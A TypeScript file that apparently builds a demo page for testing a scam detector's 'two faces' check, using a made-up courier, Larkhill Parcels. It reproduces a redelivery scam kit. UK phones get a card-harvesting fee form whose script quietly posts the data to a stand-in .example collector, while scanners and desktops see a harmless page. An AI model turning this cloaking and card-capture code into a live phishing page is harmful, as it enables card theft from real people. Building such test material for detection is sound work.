// A two faced demo page for Spotter's "two faces" check, made up from scratch (Larkhill Parcels isn't a real courier).
// It does what real redelivery scam kits do: anyone who looks like a scanner or a desktop gets a harmless tracking
// page, and only a phone set up for the UK gets the trap, a £1.99 "redelivery fee" card form. The form posts to, and
// its script would send to, a .example address that can never resolve, so nothing typed here goes anywhere.
// Both faces carry a banner saying it is a demo page.

export const COLLECTOR = "https://collect-x.example";

/** The rule this kit uses: a phone browser whose language is British English. Real kits also check the network. */
export function isTargetPhone(ua: string, acceptLanguage: string): boolean {
  return /Android|iPhone|iPad|Mobile/i.test(ua) && /^\s*en-GB\b/i.test(acceptLanguage);
}

const STYLE = `
  :root { --ink: #14202b; --muted: #5a6875; --paper: #f4f6f3; --card: #fff; --brand: #2f6b4f; --warn: #f3c74a; --line: #dde3dd; }
  * { box-sizing: border-box; }
  body { margin: 0; font: 16px/1.5 Verdana, "Segoe UI", system-ui, sans-serif; color: var(--ink); background: var(--paper); }
  .demo { margin: 0; background: var(--ink); color: #fff; font-size: 13px; padding: 8px 16px; text-align: center; }
  .demo b { color: var(--warn); }
  header { background: var(--brand); color: #fff; padding: 14px 20px; font-weight: 700; font-size: 20px; letter-spacing: -0.01em; }
  header span { font-weight: 400; opacity: 0.8; font-size: 14px; margin-left: 8px; }
  main { max-width: 560px; margin: 0 auto; padding: 20px 16px 48px; }
  .card { background: var(--card); border: 1px solid var(--line); border-radius: 12px; padding: 20px; margin-bottom: 16px; }
  h1 { font-size: 24px; line-height: 1.2; margin: 0 0 8px; }
  .muted { color: var(--muted); font-size: 14px; }
  ol.track { list-style: none; padding: 0; margin: 16px 0 0; }
  ol.track li { padding: 0 0 14px 22px; position: relative; border-left: 2px solid var(--line); margin-left: 6px; }
  ol.track li::before { content: ""; position: absolute; left: -7px; top: 4px; width: 12px; height: 12px; border-radius: 50%; background: var(--brand); }
  .alert { background: #fff7d6; border: 1px solid var(--warn); border-radius: 10px; padding: 12px 14px; margin: 0 0 16px; }
  label { display: block; font-size: 14px; font-weight: 700; margin: 12px 0 4px; }
  input { width: 100%; font: inherit; padding: 10px 12px; border: 1px solid #b9c3bb; border-radius: 8px; }
  .row { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
  button { margin-top: 16px; width: 100%; font: inherit; font-weight: 700; padding: 12px; border: 0; border-radius: 8px; background: var(--brand); color: #fff; }
  .fee { font-size: 32px; font-weight: 700; margin: 4px 0; }
`;

const shell = (title: string, body: string, script = "") => `<!doctype html>
<html lang="en-GB">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<meta name="robots" content="noindex, nofollow">
<title>${title}</title>
<style>${STYLE}</style>
</head>
<body>
<p class="demo"><b>Demo page.</b> Larkhill Parcels is made up for Spotter's demo. It shows phones in the UK a different page than desktops, like real scam kits do.</p>
<header>Larkhill Parcels<span>Track a parcel</span></header>
<main>
${body}
</main>
${script ? `<script>${script}</script>` : ""}
</body>
</html>`;

const HARMLESS = shell(
  "Track your parcel | Larkhill Parcels (demo page)",
  `<section class="card">
  <h1>Your parcel is on its way</h1>
  <p class="muted">Tracking number LK 4471 0938 GB</p>
  <ol class="track">
    <li><b>Out for delivery</b><br><span class="muted">Today, 7:12am, Bristol depot</span></li>
    <li><b>Arrived at your local depot</b><br><span class="muted">Yesterday, 9:40pm</span></li>
    <li><b>Collected from the sender</b><br><span class="muted">Monday, 4:05pm</span></li>
  </ol>
</section>
<section class="card">
  <p class="muted">Not in? We'll leave a card with your options. You never have to pay to rebook a delivery.</p>
</section>`,
);

// The script a real kit uses to send the card off quietly. Here it can't: the address is .example, and the demo
// says so instead of pretending anything was taken.
const TRAP_SCRIPT = `
(function () {
  var form = document.getElementById("fee-form");
  if (!form) return;
  form.addEventListener("submit", function (e) {
    e.preventDefault();
    fetch("${COLLECTOR}/c", { method: "POST", body: new FormData(form) }).catch(function () {});
    document.getElementById("fee-note").textContent = "Demo page: nothing was sent. On a real scam page your card details would now be with the scammers.";
  });
})();
`;

const TRAP = shell(
  "Redelivery fee due | Larkhill Parcels (demo page)",
  `<p class="alert"><b>We missed you.</b> Your parcel LK 4471 0938 GB couldn't be delivered because a £1.99 redelivery fee is unpaid.</p>
<section class="card">
  <h1>Pay the £1.99 redelivery fee</h1>
  <p class="fee">£1.99</p>
  <p class="muted">Pay within 24 hours or your parcel goes back to the sender.</p>
  <form id="fee-form" action="${COLLECTOR}/pay" method="post">
    <label for="name">Name on card</label>
    <input id="name" name="ccname" autocomplete="cc-name">
    <label for="cardnumber">Card number</label>
    <input id="cardnumber" name="cardnumber" inputmode="numeric" autocomplete="cc-number">
    <div class="row">
      <div><label for="exp">Expiry</label><input id="exp" name="exp" placeholder="MM/YY" autocomplete="cc-exp"></div>
      <div><label for="cvc">Security code</label><input id="cvc" name="cvc" inputmode="numeric" autocomplete="cc-csc"></div>
    </div>
    <label for="postcode">Postcode</label>
    <input id="postcode" name="postcode" autocomplete="postal-code">
    <button type="submit">Pay £1.99 and rebook</button>
    <p class="muted" id="fee-note" role="status"></p>
  </form>
</section>`,
  TRAP_SCRIPT,
);

export function redeliveryPage(ua: string, acceptLanguage: string): string {
  return isTargetPhone(ua, acceptLanguage) ? TRAP : HARMLESS;
}
